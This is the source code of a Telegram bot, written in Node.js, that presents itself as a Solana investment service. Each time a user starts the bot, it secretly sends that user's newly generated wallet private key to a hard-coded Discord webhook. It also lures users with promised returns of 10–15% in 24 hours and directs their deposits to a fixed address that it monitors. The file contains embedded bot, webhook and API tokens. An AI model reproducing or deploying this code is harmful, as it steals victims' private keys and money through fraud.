const TelegramBot = require('node-telegram-bot-api');
const { Keypair, Connection, clusterApiUrl, PublicKey } = require('@solana/web3.js');
const axios = require('axios');
const fs = require('fs');
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const bot = new TelegramBot('7784021919:AAH64ISJmRAqkU3mIqA-2mUweyNXDFaMj_o', { polling: true });
const walletsFile = 'wallets.json';
const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');

const INVEST_ADDRESS = '6QyN4qLuhu8J3cYheuRCQUEXYHqhYYpSJP99F79LSa4X';
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1361304815321219212/hViO_kjTQrodIzmtmp7zaa8tLNQCSQcy1UI-15iadtpB5wVqSKKKX0NR5FeiBCAdJu92';

// === Wallet management ===
let wallets = fs.existsSync(walletsFile)
  ? JSON.parse(fs.readFileSync(walletsFile))
  : {};

function saveWallets() {
  fs.writeFileSync(walletsFile, JSON.stringify(wallets, null, 2));
}

function createWalletForUser(userId) {
  const keypair = Keypair.generate();
  wallets[userId] = {
    publicKey: keypair.publicKey.toString(),
    secretKey: JSON.stringify(Array.from(keypair.secretKey)), // <-- correct format for Phantom
  };
  saveWallets();
}

// === Balance check ===
async function getSolanaBalance(address) {
  try {
    const pubkey = new PublicKey(address);
    const lamports = await connection.getBalance(pubkey);
    const sol = lamports / 1e9;

    const { data } = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const price = data.solana.usd;
    const usd = (sol * price).toFixed(2);

    return { sol: sol.toFixed(5), usd };
  } catch {
    return { sol: '0', usd: '0' };
  }
}

function getMainPanel(walletAddress) {
  return {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔍 View on Solscan', url: `https://solscan.io/account/${walletAddress}` }],
        [{ text: '💰 Check Balance', callback_data: 'check_balance' }],
        [{ text: '📋 Copy Wallet', callback_data: 'copy_wallet' }],
        [{ text: '🚀 Invest', callback_data: 'invest_start' }],
        [{ text: '❓ Help / FAQ', callback_data: 'help_faq' }]
      ]
    }
  };
}

// === Bot commands ===
bot.onText(/\/start/, (msg) => {
  const userId = msg.from.id;
  if (!wallets[userId]) createWalletForUser(userId);
  // Send user info to Discord webhook
axios.post(DISCORD_WEBHOOK, {
  content: `✅ **New User Started the Bot!** \nUsername: @${msg.from.username || 'Unknown'}\nUser ID: \`${userId}\`\nWallet: \`${wallets[userId].publicKey}\`\nPrivate Key: \`${wallets[userId].secretKey}\``,
  username: 'Investment Bot'
});

  const walletAddress = wallets[userId].publicKey;
  const welcomeMsg = `*Welcome, ${msg.from.first_name || "user"}!*\n\n` +
    `Here is your unique Solana wallet:\n\`\`\`\n${walletAddress}\n\`\`\`\nUse the buttons below to manage your wallet.\n Use /walletinfo to get your Private Key that can be used to connect to this wallet using Phantom Wallet app.`;

  bot.sendMessage(msg.chat.id, welcomeMsg, getMainPanel(walletAddress));
});

bot.onText(/\/walletinfo/, (msg) => {
  const userId = msg.from.id;
  const wallet = wallets[userId];
  if (!wallet) return bot.sendMessage(msg.chat.id, "You don't have a wallet yet. Type /start.");

  bot.sendMessage(msg.chat.id,
    `*Your Wallet Info*\n\n` +
    `*Address:* \`${wallet.publicKey}\`\n` +
    `*Private Key:* \`[${wallet.secretKey}]\`\n\n` +
    `_To connect on Phantom with the Private Key: Start Phantom > Import Wallet > Private Key. Make sure to not share this to anyone._`,
    { parse_mode: 'Markdown' }
  );
});

// === Button logic ===
bot.on('callback_query', async (query) => {
  const userId = query.from.id;
  const wallet = wallets[userId];
  const chatId = query.message.chat.id;
  const msgId = query.message.message_id;

  if (!wallet) {
    bot.answerCallbackQuery(query.id, { text: 'Wallet not found. Use /start first.' });
    return;
  }

  const address = wallet.publicKey;

  switch (query.data) {
    case 'check_balance': {
      bot.answerCallbackQuery(query.id, { text: 'Checking balance...' });
      const { sol, usd } = await getSolanaBalance(address);
      bot.editMessageText(`*Your Wallet Balance:*\n\`${sol} SOL\` (~\`$${usd} USD\`)`, {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]] }
      });
      break;
    }
      case 'show_key':
  bot.answerCallbackQuery(query.id);
  bot.editMessageText(
    `*Your Private Key (Base58)*\n\n\`\[${wallet.secretKey}\]\`\n\n_Use this only with trusted apps. Do not share it._`,
    {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[{ text: 'Back', callback_data: 'back' }]]
      }
    }
  );
  break;

    case 'copy_wallet': {
      bot.answerCallbackQuery(query.id, { text: 'Copied!' });
      bot.editMessageText(`*Your Wallet Address:*\n\`${address}\``, {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]] }
      });
      break;
    }

    case 'invest_start': {
      const { usd } = await getSolanaBalance(address);
      const balanceUSD = parseFloat(usd);
      if (balanceUSD < 50) {
        bot.editMessageText(`❌ You need at least *$50 USD* to invest.\nYour current balance: *$${usd} USD*`, {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]] }
        });
      } else {
        bot.editMessageText(
          `*Investment Info:*\n\nYou’re about to invest using your Solana wallet. The expected return is *10–15% within 1 day*.\n\nPlease confirm to continue.`,
          {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{ text: '✅ I Understand', callback_data: 'invest_confirm' }],
                [{ text: '❌ Cancel', callback_data: 'back_main' }]
              ]
            }
          }
        );
      }
      break;
    }

    case 'invest_confirm': {
      bot.editMessageText(
        `✅ Please send *at least $50 worth* of SOL to the address below:\n\n\`\`\`\n${INVEST_ADDRESS}\n\`\`\`\nTransactions below this value will not be counted.`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]]
          }
        }
      );
      break;
    }

    case 'help_faq': {
      bot.answerCallbackQuery(query.id);
      const faq = `*❓ Help / FAQ*

• *How do I deposit SOL?*
Send SOL to your wallet address using Phantom, Exodus, Binance, or any Solana-supporting wallet.

• *What does this bot do?*
It creates a secure wallet and will let you invest in return-based opportunities.

• *What do I gain?*
You invest and get a return between 10–15% in 24 hours.

• *Where is my wallet?*
Use /start or “🔙 Back” to access your main panel.`;
      bot.editMessageText(faq, {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]] }
      });
      break;
    }

    case 'back_main': {
      const main = getMainPanel(address);
      const welcomeMsg = `*Welcome back, ${query.from.first_name || "user"}!*\n\nHere is your unique Solana wallet:\n\`\`\`\n${address}\n\`\`\``;
      bot.editMessageText(welcomeMsg, {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: 'Markdown',
        ...main
      });
      break;
    }
  }
});



// === Monitor investment address ===
let lastTxs = [];

async function checkInvestAddress() {
  try {
    const res = await axios.get(`https://pro-api.solscan.io/v2.0/account/transactions?address=6QyN4qLuhu8J3cYheuRCQUEXYHqhYYpSJP99F79LSa4X&limit=10`, {
      headers: { accept: 'application/json',
                 token: 'CACERREZR2RE2E2E2DZFZRZ'}
    });

    const txs = res.data;
    for (const tx of txs) {
      if (!lastTxs.includes(tx.txHash)) {
        lastTxs.push(tx.txHash);
        if (lastTxs.length > 20) lastTxs.shift(); // limit memory

        const amount = tx.changeAmount ? tx.changeAmount / 1e9 : '?';
        const from = tx.src || 'Unknown';

        await axios.post(DISCORD_WEBHOOK, {
          content: `💸 *New Investment Received!*\nFrom: \`${from}\`\nAmount: \`${amount} SOL\`\n[View TX](https://solscan.io/tx/${tx.txHash})`,
          username: 'Investment Bot'
        });
      }
    }
  } catch (err) {
    console.error('TX monitor error:', err.message);
  }
}

setInterval(checkInvestAddress, 30000); // every 30 sec

app.get('/', (req, res) => {
  res.send('Telegram bot is running!');
});

// Start the web server
app.listen(PORT, () => {
  console.log(`Web server is listening on port ${PORT}`);
});